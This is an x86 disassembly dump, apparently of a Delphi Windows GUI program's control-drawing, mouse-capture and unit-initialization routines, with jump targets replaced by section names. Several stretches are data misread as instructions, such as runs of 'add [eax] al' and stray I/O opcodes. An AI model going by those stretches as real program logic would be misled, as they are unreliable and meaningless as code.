lea eax [ ebp - 0x19 ]
push eax
call InflateRect
test [ esi + 0x1c ] 0x10
je r-xdata
cmp [ esi + 0x182 ] 0x1
jne r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov [ ebp - 0x9 ] 0x2
mov [ ebp - 0x9 ] 0x3
jmp r-xdata
lea edx [ ebp - 0x19 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
test bl bl
jne r-xdata
mov al [ ebp - 0x9 ]
sub al 0x2
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ esi + 0x182 ] 0x3
jne r-xdata
cmp [ esi + 0x178 ] 0x0
jne r-xdata
call sub_42c460
lea ecx [ ebp - 0x28 ]
mov edx ebx
call sub_42c800
lea eax [ ebp - 0x19 ]
push eax
push 0x0
mov eax [ esi + 0x160 ]
call sub_41d4a0
push eax
call sub_42c460
lea ecx [ ebp - 0x28 ]
pop edx
call sub_42c64c
lea eax [ ebp - 0x19 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41d4a0
push eax
call sub_42c460
lea ecx [ ebp - 0x28 ]
pop edx
call sub_42c5b0
push esi
lea esi [ ebp - 0x38 ]
lea edi [ ebp - 0x19 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
call sub_42c460
lea ecx [ ebp - 0x28 ]
mov dl [ ebp - 0x9 ]
call sub_42c740
lea eax [ ebp - 0x19 ]
push eax
push 0x0
mov eax [ esi + 0x160 ]
call sub_41d4a0
push eax
call sub_42c460
lea ecx [ ebp - 0x28 ]
pop edx
call sub_42c64c
lea eax [ ebp - 0x19 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41d4a0
push eax
call sub_42c460
lea ecx [ ebp - 0x28 ]
pop edx
call sub_42c5b0
push esi
lea esi [ ebp - 0x38 ]
lea edi [ ebp - 0x19 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
mov bl 0x2
dec al
je r-xdata
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov eax [ esi + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ esi + 0x70 ]
call sub_41cd48
lea edx [ ebp - 0x19 ]
mov eax [ esi + 0x160 ]
call sub_41d120
lea ecx [ ebp - 0x8 ]
xor edx edx
xor eax eax
call sub_41245c
test bl bl
je r-xdata
cmp [ ebp - 0x9 ] 0x4
jne r-xdata
mov bl 0x3
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x40 ]
mov eax esi
call sub_434bb4
mov eax [ ebp - 0x40 ]
push eax
mov al [ esi + 0x173 ]
push eax
mov eax [ esi + 0x17c ]
push eax
mov eax [ esi + 0x174 ]
push eax
mov al [ esi + 0x182 ]
push eax
mov al [ esi + 0x178 ]
push eax
xor edx edx
mov eax esi
call sub_436e88
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x19 ]
mov edx [ esi + 0x160 ]
mov eax [ esi + 0x16c ]
call sub_42af18
mov edx 0xff000014
mov eax 0xff00000f
call sub_4231a8
mov edx eax
mov eax [ esi + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_41cd1c
lea edx [ ebp - 0x19 ]
mov eax [ esi + 0x160 ]
call sub_41d120
cmp [ esi + 0x181 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b591
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403e9c
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax 0x1
call sub_41245c
jmp r-xdata
mov eax [ esi + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41c55c
mov bl 0x4
jmp r-xdata
dec al
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x3c ]
mov eax esi
call sub_434bb4
mov eax [ ebp - 0x3c ]
push eax
mov al [ esi + 0x173 ]
push eax
mov eax [ esi + 0x17c ]
push eax
mov eax [ esi + 0x174 ]
push eax
mov al [ esi + 0x182 ]
push eax
mov al [ esi + 0x178 ]
push eax
xor edx edx
mov eax esi
call sub_436e88
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x19 ]
mov edx [ esi + 0x160 ]
mov eax [ esi + 0x16c ]
call sub_42af18
jmp r-xdata
mov bl 0x5
jmp r-xdata
sub_42b598
push ebx
push esi
add esp 0xfffffff8
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_433460
cmp esi eax
sete bl
xor bl 0x1
mov [ esi + 0x181 ] bl
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax esi
call sub_435d5c
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax esi
call sub_435d5c
jmp r-xdata
sub_42b5fc
push ebx
mov ebx eax
mov eax ebx
call sub_436c64
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov edx eax
mov eax [ ebx + 0x16c ]
call sub_42a3d0
pop ebx
retn
sub_42b628
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_436170
test bl bl
jne r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x170 ] 0x0
jne r-xdata
mov [ esi + 0x171 ] 0x1
mov [ esi + 0x182 ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42b680
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
push edi
mov ecx esi
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_436428
cmp [ ebx + 0x171 ] 0x0
je r-xdata
cmp [ ebx + 0x181 ] 0x0
jne r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax ebx
call sub_42b598
mov [ ebp - 0x2 ] 0x3
mov [ ebp - 0x2 ] 0x0
jmp r-xdata
mov al [ ebp - 0x2 ]
cmp al [ ebx + 0x182 ]
je r-xdata
mov eax ebx
call sub_4345b8
cmp esi eax
jge r-xdata
test esi esi
jl r-xdata
mov al [ ebp - 0x2 ]
mov [ ebx + 0x182 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
test edi edi
jl r-xdata
mov eax ebx
call sub_4345fc
cmp edi eax
jg r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov [ ebp - 0x2 ] 0x2
mov [ ebp - 0x2 ] 0x3
jmp r-xdata
sub_42b720
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
push esi
push edi
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_4364d0
cmp [ ebx + 0x171 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov [ ebx + 0x171 ] 0x0
test esi esi
jl r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4345b8
cmp esi eax
jge r-xdata
mov [ ebp - 0x3 ] al
cmp [ ebx + 0x168 ] 0x0
jne r-xdata
test edi edi
jl r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov [ ebx + 0x182 ] 0x0
mov [ ebx + 0x181 ] 0x0
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov eax ebx
call sub_4345fc
cmp edi eax
jle r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov dl [ ebx + 0x170 ]
xor dl 0x1
mov eax ebx
call sub_42b8d8
cmp [ ebx + 0x170 ] 0x0
je r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov al [ ebx + 0x182 ]
add al 0xfe
sub al 0x2
jb r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
mov [ ebx + 0x182 ] 0x3
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
jmp r-xdata
mov eax ebx
call sub_42b598
mov eax ebx
mov si 0xffeb
call sub_403324
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
sub_42b86c
push esi
mov esi eax
test dl dl
jae r-xdata
cmp dl 0x4
jbe r-xdata
mov dl 0x1
jmp r-xdata
mov eax [ esi + 0x16c ]
cmp dl [ eax + 0x20 ]
je r-xdata
mov dl 0x4
pop esi
retn
call sub_42a3a8
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42b8a0
add esp 0xfffffff0
mov edx [ eax + 0x168 ]
test edx edx
je r-xdata
add esp 0x10
retn
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov [ esp ] 0xb018
mov [ esp + 0x4 ] edx
mov [ esp + 0x8 ] eax
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov eax [ eax + 0x30 ]
call sub_4380e0
sub_42b8d8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x168 ] 0x0
jne r-xdata
cmp bl [ esi + 0x170 ]
je r-xdata
xor ebx ebx
pop esi
pop ebx
retn
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov [ esi + 0x170 ] bl
test bl bl
je r-xdata
cmp [ esi + 0x172 ] 0x0
je r-xdata
mov [ esi + 0x182 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
cmp [ esi + 0x182 ] 0x0
jne r-xdata
mov eax esi
call sub_42b8a0
mov [ esi + 0x182 ] 0x3
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
test bl bl
je r-xdata
sub_42b9d0
push esi
mov esi eax
cmp dl [ esi + 0x178 ]
je r-xdata
pop esi
retn
mov [ esi + 0x178 ] dl
test dl dl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42ba40
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
and eax 0x7f
mov dl [ eax + rw-data ]
mov eax [ ebx + 0x16c ]
call sub_42a3d0
mov eax ebx
call sub_42b598
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop ebx
retn
sub_42ba74
push ebx
push esi
mov ebx eax
mov eax [ edx + 0x4 ]
cmp eax [ ebx + 0x168 ]
jne r-xdata
pop esi
pop ebx
retn
mov esi [ edx + 0x8 ]
cmp ebx esi
je r-xdata
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov al [ esi + 0x172 ]
mov [ ebx + 0x172 ] al
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov [ ebx + 0x170 ] 0x0
mov [ ebx + 0x182 ] 0x0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_4413f0
sub_42bae4
push ebp
mov ebp esp
push 0x0
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_42bb6d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_434bb4
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_44c68c
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov eax [ esi + 0x30 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov eax esi
mov si 0xffeb
call sub_403324
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bb74
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_42bbb0
push ebx
push esi
mov esi eax
mov eax esi
call sub_4368d4
cmp [ esi + 0x180 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
call sub_42c460
call sub_42c540
test al al
je r-xdata
cmp [ esi + 0x5d ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x181 ] 0x1
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call GetCapture
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
mov bl 0x1
sub_42bc24
push ebx
push esi
mov esi eax
mov eax esi
call sub_4368ec
cmp [ esi + 0x180 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov [ esi + 0x181 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call sub_42c460
call sub_42c540
test al al
je r-xdata
cmp [ esi + 0x171 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
mov bl 0x1
sub_42bc8c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42b83c
mov ebx eax
mov edx [ esi + 0x34 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ esi + 0x30 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax ebx
call sub_421634
mov eax [ eax + 0x14 ]
mov edx 0xff00ff
call sub_41cd48
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_412484
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_421634
pop edx
call sub_41d120
push 0x0
push edi
push 0x1
mov eax ebx
call sub_421634
mov edx eax
xor ecx ecx
mov eax esi
call sub_442774
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42bd1c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_436a7c
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
test bl bl
jne r-xdata
mov edx [ esi + 0x6c ]
mov eax [ ebp - 0x4 ]
call sub_42b964
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x168 ] 0x0
jne r-xdata
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42b83c
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax [ esi + 0x5c ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
cmp [ esi + 0x80 ] 0x0
jl r-xdata
mov ebx esi
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x38 ]
call sub_44225c
cmp eax [ ebx + 0x80 ]
jle r-xdata
push ebp
mov eax esi
mov edx [ eax + 0x80 ]
mov eax [ eax + 0x5c ]
mov eax [ eax + 0x38 ]
call sub_42bc8c
pop ecx
sub_42bdd8
or al [ eax ]
add [ eax ] al
sub [ ecx - 0x504bffba ] 0x46
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 4 + 0x46 ] bh
add [ eax + 0x46ae ] dl
add [ eax ] al
add [ eax - 0x57 ] bh
inc esi
add [ eax ] dh
scasb [ edi ]
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 4 + 0x46 ] dh
add [ edi + ebp * 4 ] dl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax - 0x57 ] dh
inc esi
add al ah
scasd [ edi ]
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 4 + 0x46 ] ch
add al ch
mov cl 0x46
add [ eax ] al
add [ eax ] al
add [ eax - 0x57 ] ch
inc esi
add [ eax ] bl
mov al 0x46
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 4 + 0x46 ] ah
add [ eax + 0x46b0 ] bl
add [ eax ] al
add [ eax - 0x57 ] ah
inc esi
add ah cl
mov cl 0x46
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 4 + 0x46 ] bl
add [ eax - 0x52 ] dl
inc esi
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42be80
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42be87
retn
call sub_42bdbc
sub_42beb4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42bed9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bee0
retn
sub_42befb
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42bf40
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bf47
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_4048f4
sub_42bf63
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42bfa8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bfaf
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_4048f4
sub_42bfbf
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c015
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c01c
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_403e78
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42c028
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c06c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c073
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42c080
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c0a5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c0ac
retn
sub_42c0b8
add al 0xc1
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + eax * 8 ] cl
inc edx
add [ eax + eax ] al
add [ eax ] al
mov al [ 0x70004010 ]
xor eax [ eax ]
jl r-xdata
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
jbe r-xdata
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
insb
jb r-xdata
inc esi
outsd
jb r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
nop
rol [ edx ] 0xa4
rol [ edx ] 0xb
push esp
inc ebx
outsd
outsb
jbe r-xdata
xchg edx eax
imul ebp [ edi + 0x6e ] 0x6d726f46
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
popad
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax - 0x1 ] dl
add eax [ eax ]
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
nop
insb
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
insb
imul ebp [ edi + 0x6e ] r-xdata
push cs
push sub_42c227
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
add bh bh
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c22e
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_4048a8
mov eax rw-data
mov edx [ r-xdata ]
call sub_4048a8
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42c1b8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c227
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c22e
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_4048a8
mov eax rw-data
mov edx [ r-xdata ]
call sub_4048a8
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42c480
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
call sub_4262d4
mov [ esi + 0x5 ] al
call sub_42c158
cmp eax 0x60000
setge al
mov [ esi + 0x4 ] al
mov eax esi
call sub_42cd94
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_42c4cc
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax esi
call sub_42c56c
call sub_426114
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_42c500
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_42c56c
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_42c5b0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42c500
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42c600
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42c500
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_42c64c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42c500
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42c690
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42c500
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_42c6d8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov dl [ ebx ]
mov eax esi
call sub_42c500
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_42c740
mov [ ecx ] 0x0
xor eax eax
mov al dl
cmp eax 0xf
jge r-xdata
add eax 0xfffffff1
sub eax 0xc
jb r-xdata
add eax 0xfffffffe
sub eax 0x5
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xf
jmp r-xdata
sub eax 0x2
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x8
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x4
mov eax 0x1b
jmp r-xdata
je r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x1d
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_42c7c4
